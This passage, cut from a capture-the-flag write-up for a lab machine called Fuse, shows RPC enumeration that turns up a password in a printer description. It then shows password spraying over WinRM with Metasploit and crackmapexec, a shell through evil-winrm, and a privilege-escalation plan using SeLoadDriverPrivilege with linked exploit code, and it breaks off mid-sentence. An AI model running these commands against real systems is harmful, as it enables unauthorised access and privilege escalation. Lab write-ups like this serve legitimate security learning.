+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+</pre><td class="rouge-code"><pre>rpcclient <span class="nv">$&gt;</span> enumprivs
+found 35 privileges
+
+SeCreateTokenPrivilege 		0:2 <span class="o">(</span>0x0:0x2<span class="o">)</span>
+SeAssignPrimaryTokenPrivilege 		0:3 <span class="o">(</span>0x0:0x3<span class="o">)</span>
+SeLockMemoryPrivilege 		0:4 <span class="o">(</span>0x0:0x4<span class="o">)</span>
+SeIncreaseQuotaPrivilege 		0:5 <span class="o">(</span>0x0:0x5<span class="o">)</span>
+SeMachineAccountPrivilege 		0:6 <span class="o">(</span>0x0:0x6<span class="o">)</span>
+SeTcbPrivilege 		0:7 <span class="o">(</span>0x0:0x7<span class="o">)</span>
+SeSecurityPrivilege 		0:8 <span class="o">(</span>0x0:0x8<span class="o">)</span>
+SeTakeOwnershipPrivilege 		0:9 <span class="o">(</span>0x0:0x9<span class="o">)</span>
+SeLoadDriverPrivilege 		0:10 <span class="o">(</span>0x0:0xa<span class="o">)</span>
+SeSystemProfilePrivilege 		0:11 <span class="o">(</span>0x0:0xb<span class="o">)</span>
+SeSystemtimePrivilege 		0:12 <span class="o">(</span>0x0:0xc<span class="o">)</span>
+SeProfileSingleProcessPrivilege 		0:13 <span class="o">(</span>0x0:0xd<span class="o">)</span>
+SeIncreaseBasePriorityPrivilege 		0:14 <span class="o">(</span>0x0:0xe<span class="o">)</span>
+SeCreatePagefilePrivilege 		0:15 <span class="o">(</span>0x0:0xf<span class="o">)</span>
+SeCreatePermanentPrivilege 		0:16 <span class="o">(</span>0x0:0x10<span class="o">)</span>
+SeBackupPrivilege 		0:17 <span class="o">(</span>0x0:0x11<span class="o">)</span>
+SeRestorePrivilege 		0:18 <span class="o">(</span>0x0:0x12<span class="o">)</span>
+SeShutdownPrivilege 		0:19 <span class="o">(</span>0x0:0x13<span class="o">)</span>
+SeDebugPrivilege 		0:20 <span class="o">(</span>0x0:0x14<span class="o">)</span>
+SeAuditPrivilege 		0:21 <span class="o">(</span>0x0:0x15<span class="o">)</span>
+SeSystemEnvironmentPrivilege 		0:22 <span class="o">(</span>0x0:0x16<span class="o">)</span>
+SeChangeNotifyPrivilege 		0:23 <span class="o">(</span>0x0:0x17<span class="o">)</span>
+SeRemoteShutdownPrivilege 		0:24 <span class="o">(</span>0x0:0x18<span class="o">)</span>
+SeUndockPrivilege 		0:25 <span class="o">(</span>0x0:0x19<span class="o">)</span>
+SeSyncAgentPrivilege 		0:26 <span class="o">(</span>0x0:0x1a<span class="o">)</span>
+SeEnableDelegationPrivilege 		0:27 <span class="o">(</span>0x0:0x1b<span class="o">)</span>
+SeManageVolumePrivilege 		0:28 <span class="o">(</span>0x0:0x1c<span class="o">)</span>
+SeImpersonatePrivilege 		0:29 <span class="o">(</span>0x0:0x1d<span class="o">)</span>
+SeCreateGlobalPrivilege 		0:30 <span class="o">(</span>0x0:0x1e<span class="o">)</span>
+SeTrustedCredManAccessPrivilege 		0:31 <span class="o">(</span>0x0:0x1f<span class="o">)</span>
+SeRelabelPrivilege 		0:32 <span class="o">(</span>0x0:0x20<span class="o">)</span>
+SeIncreaseWorkingSetPrivilege 		0:33 <span class="o">(</span>0x0:0x21<span class="o">)</span>
+SeTimeZonePrivilege 		0:34 <span class="o">(</span>0x0:0x22<span class="o">)</span>
+SeCreateSymbolicLinkPrivilege 		0:35 <span class="o">(</span>0x0:0x23<span class="o">)</span>
+SeDelegateSessionUserImpersonatePrivilege 		0:36 <span class="o">(</span>0x0:0x24<span class="o">)</span>
+rpcclient <span class="nv">$&gt;</span>
+</pre></table></code></div></div><p>The user have some <strong>pretty</strong> good <code class="language-plaintext highlighter-rouge">privileges</code> on the machine</p><p>The website was about <code class="language-plaintext highlighter-rouge">printers</code> , Better if we just do some enum on printers.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+</pre><td class="rouge-code"><pre>      adddriver		Add a print driver
+     addprinter		Add a printer
+      deldriver		Delete a printer driver
+    deldriverex		Delete a printer driver with files
+       enumdata		Enumerate printer data
+     enumdataex		Enumerate printer data <span class="k">for </span>a key
+        enumkey		Enumerate printer keys
+       enumjobs		Enumerate print <span class="nb">jobs
+         </span>getjob		Get print job
+         setjob		Set print job
+      enumports		Enumerate printer ports
+    enumdrivers		Enumerate installed printer drivers
+   enumprinters		Enumerate printers
+        getdata		Get print driver data
+      getdataex		Get printer driver data with keyname
+      getdriver		Get print driver information
+   getdriverdir		Get print driver upload directory
+getdriverpackagepath		Get print driver package download directory
+     getprinter		Get printer info
+    openprinter		Open printer handle
+ openprinter_ex		Open printer handle
+      setdriver		Set printer driver
+getprintprocdir		Get print processor directory
+        addform		Add form
+        setform		Set form
+        getform		Get form
+     deleteform		Delete form
+      enumforms		Enumerate forms
+     setprinter		Set printer comment
+ setprintername		Set printername
+ setprinterdata		Set REG_SZ printer data
+       rffpcnex		Rffpcnex <span class="nb">test
+     </span>printercmp		Printer comparison <span class="nb">test
+      </span>enumprocs		Enumerate Print Processors
+enumprocdatatypes		Enumerate Print Processor Data Types
+   enummonitors		Enumerate Print Monitors
+createprinteric		Create Printer IC
+</pre></table></code></div></div><p>There are some pretty good <code class="language-plaintext highlighter-rouge">commands</code> <strong>regarding</strong> the <strong>printers</strong></p><blockquote><p>enumprinters Enumerate printers</p></blockquote><p>I cant list and enumerate the <code class="language-plaintext highlighter-rouge">printers</code> by using <strong>enumprinters</strong></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>rpcclient <span class="nv">$&gt;</span> enumprinters
+	flags:[0x800000]
+	name:[<span class="se">\\</span>10.10.10.193<span class="se">\H</span>P-MFT01]
+	description:[<span class="se">\\</span>10.10.10.193<span class="se">\H</span>P-MFT01,HP Universal Printing PCL 6,Central <span class="o">(</span>Near IT, scan2docs password: <span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span><span class="o">)]</span>
+	comment:[]
+
+rpcclient <span class="nv">$&gt;</span>
+</pre></table></code></div></div><p>And herew I got <code class="language-plaintext highlighter-rouge">lucky</code> , Got a password here <code class="language-plaintext highlighter-rouge">$fab@s3Rv1ce$1</code></p><h2 id="username-spraying-on-winrm-protocol">Username spraying on winrm protocol</h2><p>Now…since the <code class="language-plaintext highlighter-rouge">winrm</code> port is opened , And i can use <code class="language-plaintext highlighter-rouge">crackmapexec</code> or metasploit to spray usernames that i got from the <code class="language-plaintext highlighter-rouge">rpcclient</code> using <strong>enumdomusers</strong></p><blockquote><p>Using metasploit</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre>msf5 auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>PASSWORD <span class="s1">'$fab@s3Rv1ce$1'</span>                                                                
+PASSWORD <span class="o">=&gt;</span> <span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>                                                                    
+msf5 auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>USER_FILE <span class="nb">users                                                                                  
+</span>USER_FILE <span class="o">=&gt;</span> <span class="nb">users                                                                                            
+</span>msf5 auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 10.10.10.193                                                                                       
+RHOSTS <span class="o">=&gt;</span> 10.10.10.193                                                                                                                         
+msf5 auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;</span>                                                                                       
+msf5 auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;</span> run  
+<span class="o">[!]</span> No active DB <span class="nt">--</span> Credential data will not be saved!
+<span class="o">[</span>-] 10.10.10.193:5985 - LOGIN FAILED: WORKSTATION<span class="se">\D</span>efaultAccount:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="o">(</span>Incorrect: <span class="o">)</span>
+<span class="o">[</span>-] 10.10.10.193:5985 - LOGIN FAILED: WORKSTATION<span class="se">\A</span>dministrator:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="o">(</span>Incorrect: <span class="o">)</span>
+<span class="o">[</span>-] 10.10.10.193:5985 - LOGIN FAILED: WORKSTATION<span class="se">\k</span>rbtgt:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="o">(</span>Incorrect: <span class="o">)</span>
+<span class="o">[</span>-] 10.10.10.193:5985 - LOGIN FAILED: WORKSTATION<span class="se">\p</span>merton:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="o">(</span>Incorrect: <span class="o">)</span>
+<span class="o">[</span>-] 10.10.10.193:5985 - LOGIN FAILED: WORKSTATION<span class="se">\t</span>lavel:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="o">(</span>Incorrect: <span class="o">)</span>
+<span class="o">[</span>-] 10.10.10.193:5985 - LOGIN FAILED: WORKSTATION<span class="se">\s</span>thompson:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="o">(</span>Incorrect: <span class="o">)</span>
+<span class="o">[</span>-] 10.10.10.193:5985 - LOGIN FAILED: WORKSTATION<span class="se">\b</span>hult:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="o">(</span>Incorrect: <span class="o">)</span>
+<span class="o">[</span>-] 10.10.10.193:5985 - LOGIN FAILED: WORKSTATION<span class="se">\b</span>nielson:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="o">(</span>Incorrect: <span class="o">)</span>
+<span class="o">[</span>-] 10.10.10.193:5985 - LOGIN FAILED: WORKSTATION<span class="se">\d</span>andrews:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="o">(</span>Incorrect: <span class="o">)</span>
+<span class="o">[</span>-] 10.10.10.193:5985 - LOGIN FAILED: WORKSTATION<span class="se">\m</span>berbatov:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="o">(</span>Incorrect: <span class="o">)</span>
+<span class="o">[</span>-] 10.10.10.193:5985 - LOGIN FAILED: WORKSTATION<span class="se">\a</span>stein:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="o">(</span>Incorrect: <span class="o">)</span>
+<span class="o">[</span>-] 10.10.10.193:5985 - LOGIN FAILED: WORKSTATION<span class="se">\d</span>muir:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="o">(</span>Incorrect: <span class="o">)</span>
+<span class="o">[</span>-] 10.10.10.193:5985 - LOGIN FAILED: WORKSTATION<span class="se">\s</span>vc-scan:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="o">(</span>Incorrect: <span class="o">)</span>
+<span class="o">[</span>+] 10.10.10.193:5985 - Login Successful: WORKSTATION<span class="se">\s</span>vc-print:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+<span class="o">[</span>-] 10.10.10.193:5985 - LOGIN FAILED: WORKSTATION<span class="se">\G</span>uest:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="o">(</span>Incorrect: <span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Scanned 1 of 1 hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Auxiliary module execution completed
+</pre></table></code></div></div><blockquote><p>using crackmapexec</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>➜  fuse crackmapexec winrm <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-p</span> <span class="s1">'$fab@s3Rv1ce$1'</span> <span class="nt">-d</span> FABRICORP fuse.htb
+WINRM       10.10.10.193    5985   fuse.htb         <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.193:5985/wsman
+WINRM       10.10.10.193    5985   fuse.htb         <span class="o">[</span>-] FABRICORP<span class="se">\D</span>efaultAccount:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="s2">"Failed to authenticate the user DefaultAccount with ntlm"</span>
+WINRM       10.10.10.193    5985   fuse.htb         <span class="o">[</span>-] FABRICORP<span class="se">\A</span>dministrator:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="s2">"Failed to authenticate the user Administrator with ntlm"</span>
+WINRM       10.10.10.193    5985   fuse.htb         <span class="o">[</span>-] FABRICORP<span class="se">\k</span>rbtgt:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="s2">"Failed to authenticate the user krbtgt with ntlm"</span>
+WINRM       10.10.10.193    5985   fuse.htb         <span class="o">[</span>-] FABRICORP<span class="se">\p</span>merton:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="s2">"Failed to authenticate the user pmerton with ntlm"</span>
+WINRM       10.10.10.193    5985   fuse.htb         <span class="o">[</span>-] FABRICORP<span class="se">\t</span>lavel:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="s2">"Failed to authenticate the user tlavel with ntlm"</span>
+WINRM       10.10.10.193    5985   fuse.htb         <span class="o">[</span>-] FABRICORP<span class="se">\s</span>thompson:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="s2">"Failed to authenticate the user sthompson with ntlm"</span>
+WINRM       10.10.10.193    5985   fuse.htb         <span class="o">[</span>-] FABRICORP<span class="se">\b</span>hult:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="s2">"Failed to authenticate the user bhult with ntlm"</span>
+WINRM       10.10.10.193    5985   fuse.htb         <span class="o">[</span>-] FABRICORP<span class="se">\b</span>nielson:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="s2">"Failed to authenticate the user bnielson with ntlm"</span>
+WINRM       10.10.10.193    5985   fuse.htb         <span class="o">[</span>-] FABRICORP<span class="se">\d</span>andrews:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="s2">"Failed to authenticate the user dandrews with ntlm"</span>
+WINRM       10.10.10.193    5985   fuse.htb         <span class="o">[</span>-] FABRICORP<span class="se">\m</span>berbatov:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="s2">"Failed to authenticate the user mberbatov with ntlm"</span>
+WINRM       10.10.10.193    5985   fuse.htb         <span class="o">[</span>-] FABRICORP<span class="se">\a</span>stein:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="s2">"Failed to authenticate the user astein with ntlm"</span>
+WINRM       10.10.10.193    5985   fuse.htb         <span class="o">[</span>-] FABRICORP<span class="se">\d</span>muir:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="s2">"Failed to authenticate the user dmuir with ntlm"</span>
+WINRM       10.10.10.193    5985   fuse.htb         <span class="o">[</span>-] FABRICORP<span class="se">\s</span>vc-scan:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="s2">"Failed to authenticate the user svc-scan with ntlm"</span>
+WINRM       10.10.10.193    5985   fuse.htb         <span class="o">[</span>+] FABRICORP<span class="se">\s</span>vc-print:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</pre></table></code></div></div><p>The user is <code class="language-plaintext highlighter-rouge">svc-print</code> and i can login myself to the machine using <code class="language-plaintext highlighter-rouge">evil-winrm</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>➜  fuse evil-winrm <span class="nt">-u</span> svc-print <span class="nt">-p</span> <span class="s1">'$fab@s3Rv1ce$1'</span> <span class="nt">-i</span> fuse.htb                    
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-print<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>fabricorp<span class="se">\s</span>vc-print
+</pre></table></code></div></div><h1 id="got-usertxt">Got user.txt</h1><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc-print\desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">
+</span><span class="mi">3148</span><span class="nf">b09cce76eee40d9bc602744269c1</span><span class="w">
+</span></pre></table></code></div></div><h1 id="privilege-escaltion">Privilege escaltion</h1><p>Now its time for escalating the <code class="language-plaintext highlighter-rouge">privileges</code></p><blockquote><p>whoami /all</p></blockquote><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc-print\desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/all</span><span class="w">
+
+</span><span class="nf">USER</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="nf">----------------</span><span class="w">
+
+</span><span class="nf">User</span><span class="w"> </span><span class="nx">Name</span><span class="w">           </span><span class="nx">SID</span><span class="w">
+</span><span class="o">===================</span><span class="w"> </span><span class="o">==============================================</span><span class="w">
+</span><span class="nf">fabricorp\svc-print</span><span class="w"> </span><span class="nx">S-1-5-21-2633719317-1471316042-3957863514-1104</span><span class="w">
+
+
+</span><span class="nf">GROUP</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="nf">-----------------</span><span class="w">
+
+</span><span class="nf">Group</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                 </span><span class="nx">Type</span><span class="w">             </span><span class="nx">SID</span><span class="w">                                            </span><span class="nx">Attributes</span><span class="w">
+</span><span class="o">==========================================</span><span class="w"> </span><span class="o">================</span><span class="w"> </span><span class="o">==============================================</span><span class="w"> </span><span class="o">==================================================</span><span class="w">
+</span><span class="nf">Everyone</span><span class="w">                                   </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-1-0</span><span class="w">                                        </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">BUILTIN\Print</span><span class="w"> </span><span class="nx">Operators</span><span class="w">                    </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-550</span><span class="w">                                   </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">BUILTIN\Users</span><span class="w">                              </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-545</span><span class="w">                                   </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">BUILTIN\Pre-Windows</span><span class="w"> </span><span class="nx">2000</span><span class="w"> </span><span class="nx">Compatible</span><span class="w"> </span><span class="nx">Access</span><span class="w"> </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-554</span><span class="w">                                   </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">BUILTIN\Remote</span><span class="w"> </span><span class="nx">Management</span><span class="w"> </span><span class="nx">Users</span><span class="w">            </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-580</span><span class="w">                                   </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">NT</span><span class="w"> </span><span class="nx">AUTHORITY\NETWORK</span><span class="w">                       </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-2</span><span class="w">                                        </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">NT</span><span class="w"> </span><span class="nx">AUTHORITY\Authenticated</span><span class="w"> </span><span class="nx">Users</span><span class="w">           </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-11</span><span class="w">                                       </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">NT</span><span class="w"> </span><span class="nx">AUTHORITY\This</span><span class="w"> </span><span class="nx">Organization</span><span class="w">             </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-15</span><span class="w">                                       </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">FABRICORP\IT_Accounts</span><span class="w">                      </span><span class="nx">Group</span><span class="w">            </span><span class="nx">S-1-5-21-2633719317-1471316042-3957863514-1604</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">NT</span><span class="w"> </span><span class="nx">AUTHORITY\NTLM</span><span class="w"> </span><span class="nx">Authentication</span><span class="w">           </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-64-10</span><span class="w">                                    </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">Mandatory</span><span class="w"> </span><span class="nx">Label\High</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">Level</span><span class="w">       </span><span class="nx">Label</span><span class="w">            </span><span class="nx">S-1-16-12288</span><span class="w">
+
+
+</span><span class="nf">PRIVILEGES</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="nf">----------------------</span><span class="w">
+
+</span><span class="nf">Privilege</span><span class="w"> </span><span class="nx">Name</span><span class="w">                </span><span class="nx">Description</span><span class="w">                    </span><span class="nx">State</span><span class="w">
+</span><span class="o">=============================</span><span class="w"> </span><span class="o">==============================</span><span class="w"> </span><span class="o">=======</span><span class="w">
+</span><span class="nf">SeMachineAccountPrivilege</span><span class="w">     </span><span class="nx">Add</span><span class="w"> </span><span class="nx">workstations</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">domain</span><span class="w">     </span><span class="nx">Enabled</span><span class="w">
+</span><span class="nf">SeLoadDriverPrivilege</span><span class="w">         </span><span class="nx">Load</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">unload</span><span class="w"> </span><span class="nx">device</span><span class="w"> </span><span class="nx">drivers</span><span class="w"> </span><span class="nx">Enabled</span><span class="w">
+</span><span class="nf">SeShutdownPrivilege</span><span class="w">           </span><span class="nx">Shut</span><span class="w"> </span><span class="nx">down</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">system</span><span class="w">           </span><span class="nx">Enabled</span><span class="w">
+</span><span class="nf">SeChangeNotifyPrivilege</span><span class="w">       </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="nx">checking</span><span class="w">       </span><span class="nx">Enabled</span><span class="w">
+</span><span class="nf">SeIncreaseWorkingSetPrivilege</span><span class="w"> </span><span class="nx">Increase</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">working</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">Enabled</span><span class="w">
+
+
+</span><span class="nf">USER</span><span class="w"> </span><span class="nx">CLAIMS</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="nf">-----------------------</span><span class="w">
+
+</span><span class="nf">User</span><span class="w"> </span><span class="nx">claims</span><span class="w"> </span><span class="nx">unknown.</span><span class="w">
+
+</span><span class="nf">Kerberos</span><span class="w"> </span><span class="nx">support</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">Dynamic</span><span class="w"> </span><span class="nx">Access</span><span class="w"> </span><span class="nx">Control</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">device</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">been</span><span class="w"> </span><span class="nx">disabled.</span><span class="w">
+</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc-print\desktop</span><span class="err">&gt;</span><span class="w">
+</span></pre></table></code></div></div><p>The permission seems very <code class="language-plaintext highlighter-rouge">suspicious</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>SeLoadDriverPrivilege         Load and unload device drivers Enabled
+</pre></table></code></div></div><p>A quick <strong>google-search</strong> show me a good article on this</p><blockquote><p><a href="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" target="_blank">https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/</a></p></blockquote><p>In this article its is shown that we cal <code class="language-plaintext highlighter-rouge">load</code> our own drivers and we can run a specific command as <code class="language-plaintext highlighter-rouge">admin</code> since we are already priviled to do it…</p><h2 id="compiling-files">Compiling files</h2><p>What i am gonna do is first compile both the two files</p><blockquote><p>eoploaddriver.cpp</p></blockquote><p><a href="https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp" target="_blank">https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp</a></p><blockquote><p>ExploitCapcom.cpp</p></blockquote><p><a href="https://github.com/tandasat/ExploitCapcom" target="_blank">https://github.com/tandasat/ExploitCapcom</a></p><p>I compiled both the files using <code class="language-plaintext highlighter-rouge">Visual-studio</code> and got the <strong>exe</strong> files as 